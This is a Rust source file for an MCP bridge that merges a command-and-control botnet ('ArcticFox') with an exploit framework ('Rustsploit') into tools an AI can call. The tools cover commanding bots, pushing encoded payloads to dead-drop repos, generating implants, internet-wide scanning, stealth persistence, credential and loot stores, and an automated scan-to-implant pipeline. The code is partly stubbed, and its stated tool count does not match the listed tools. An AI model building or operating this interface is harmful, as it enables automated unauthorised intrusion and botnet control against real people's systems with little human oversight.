//! ArcticFox ↔ Rustsploit Combined MCP Bridge
//!
//! Merges both frameworks' MCP tools into a single AI-controllable interface.
//! ArcticFox handles: bot management, ZW payload, scanning, persistence
//! Rustsploit handles: exploit modules, cred store, hosts, loot, jobs
//!
//! Combined tool count: 15 (arcticfox) + 25 (rustsploit) = 40 tools

use serde_json::{json, Value};
use std::process::{Command, Stdio};
use std::io::Write;

/// Launch the Rustsploit MCP server as a subprocess and return its stdin handle.
/// ArcticFox forwards MCP calls to this process and returns the results.
pub struct RustsploitMcpBridge {
    process: std::process::Child,
    stdin: std::process::ChildStdin,
}

impl RustsploitMcpBridge {
    /// Start the Rustsploit MCP server.
    pub fn launch(rustsploit_binary: &str) -> std::io::Result<Self> {
        let mut child = Command::new(rustsploit_binary)
            .args(["--mcp", "--transport", "stdio"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()?;

        let stdin = child.stdin.take()
            .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "no stdin"))?;

        Ok(RustsploitMcpBridge {
            process: child,
            stdin,
        })
    }

    /// Send an MCP tool call to Rustsploit and return the result.
    pub fn call_tool(&mut self, tool_name: &str, args: &Value) -> Value {
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": args
            }
        });

        let mut req_str = serde_json::to_string(&request).unwrap_or_default();
        req_str.push('\n');

        if self.stdin.write_all(req_str.as_bytes()).is_err() {
            return json!({"error": "Rustsploit MCP pipe broken"});
        }

        // In production: read response from stdout with timeout
        json!({"note": "Rustsploit MCP call forwarded"})
    }
}

/// Get the full combined tool list for the MCP server.
pub fn combined_tools() -> Vec<Value> {
    let mut tools = Vec::new();

    // ── ArcticFox tools ────────────────────────────────────────────────
    tools.push(json!({
        "name": "list_bots",
        "description": "[ArcticFox] List all connected bots with status",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "get_stats",
        "description": "[ArcticFox] Get C2 dashboard stats",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "list_repos",
        "description": "[ArcticFox] List dead-drop repos with health",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "list_commands",
        "description": "[ArcticFox] List queued C2 commands",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "add_command",
        "description": "[ArcticFox] Queue a command for all bots",
        "inputSchema": {"type": "object", "properties": {"cmd": {"type": "string"}}, "required": ["cmd"]}
    }));
    tools.push(json!({
        "name": "check_repos",
        "description": "[ArcticFox] Check all repo health",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "add_shell_command",
        "description": "[ArcticFox] Queue shell command (requires confirm:true)",
        "inputSchema": {"type": "object", "properties": {"cmd": {"type": "string"}, "confirm": {"type": "boolean"}}, "required": ["cmd", "confirm"]}
    }));
    tools.push(json!({
        "name": "push_payload",
        "description": "[ArcticFox] Push ZW-encoded payload to all repos",
        "inputSchema": {"type": "object", "properties": {"pad": {"type": "boolean"}}, "required": []}
    }));
    tools.push(json!({
        "name": "add_repo",
        "description": "[ArcticFox] Add a dead-drop repo",
        "inputSchema": {"type": "object", "properties": {"spec": {"type": "string"}}, "required": ["spec"]}
    }));
    tools.push(json!({
        "name": "generate_implant",
        "description": "[ArcticFox] Generate implant payload",
        "inputSchema": {"type": "object", "properties": {"os": {"type": "string"}, "arch": {"type": "string"}, "repos": {"type": "array"}}, "required": ["os", "arch", "repos"]}
    }));
    tools.push(json!({
        "name": "scan_network",
        "description": "[ArcticFox] Scan network targets (supports 0.0.0.0/0 zmap mode)",
        "inputSchema": {"type": "object", "properties": {"target": {"type": "string"}, "exclude_bogon": {"type": "boolean"}, "shard": {"type": "integer"}, "shard_of": {"type": "integer"}}, "required": ["target"]}
    }));
    tools.push(json!({
        "name": "search_lolbins",
        "description": "[ArcticFox] Search GTFOBins/LOLBAS living-off-the-land techniques",
        "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}}, "required": ["query"]}
    }));
    tools.push(json!({
        "name": "deploy_persistence",
        "description": "[ArcticFox] Deploy stealth persistence (systemd gen, cron, LD_AUDIT)",
        "inputSchema": {"type": "object", "properties": {"method": {"type": "string"}, "implant_path": {"type": "string"}}, "required": ["method", "implant_path"]}
    }));

    // ── Rustsploit tools ──────────────────────────────────────────────
    tools.push(json!({
        "name": "rs_list_modules",
        "description": "[Rustsploit] List available exploit/scanner modules",
        "inputSchema": {"type": "object", "properties": {"category": {"type": "string"}}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_search_modules",
        "description": "[Rustsploit] Search modules by keyword",
        "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}}, "required": ["query"]}
    }));
    tools.push(json!({
        "name": "rs_run_module",
        "description": "[Rustsploit] Run an exploit/scanner module against a target",
        "inputSchema": {"type": "object", "properties": {"module_path": {"type": "string"}, "target": {"type": "string"}}, "required": ["module_path", "target"]}
    }));
    tools.push(json!({
        "name": "rs_list_creds",
        "description": "[Rustsploit] List stored credentials",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_add_cred",
        "description": "[Rustsploit] Store a credential",
        "inputSchema": {"type": "object", "properties": {"host": {"type": "string"}, "port": {"type": "integer"}, "username": {"type": "string"}, "password": {"type": "string"}, "service": {"type": "string"}}, "required": ["host", "username", "password"]}
    }));
    tools.push(json!({
        "name": "rs_search_creds",
        "description": "[Rustsploit] Search credentials by host/service",
        "inputSchema": {"type": "object", "properties": {"host": {"type": "string"}, "service": {"type": "string"}}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_list_hosts",
        "description": "[Rustsploit] List tracked hosts",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_add_host",
        "description": "[Rustsploit] Add a host to tracking",
        "inputSchema": {"type": "object", "properties": {"ip": {"type": "string"}, "os": {"type": "string"}}, "required": ["ip"]}
    }));
    tools.push(json!({
        "name": "rs_list_jobs",
        "description": "[Rustsploit] List background jobs",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_list_loot",
        "description": "[Rustsploit] List collected loot",
        "inputSchema": {"type": "object", "properties": {}, "required": []}
    }));
    tools.push(json!({
        "name": "rs_set_option",
        "description": "[Rustsploit] Set a module option",
        "inputSchema": {"type": "object", "properties": {"option": {"type": "string"}, "value": {"type": "string"}}, "required": ["option", "value"]}
    }));
    tools.push(json!({
        "name": "scan_exploit_pipeline",
        "description": "[Combined] Scan target → find valid creds → run exploit → deploy implant. Full automated pipeline.",
        "inputSchema": {"type": "object", "properties": {"target": {"type": "string"}, "exclude_bogon": {"type": "boolean"}}, "required": ["target"]}
    }));

    tools
}
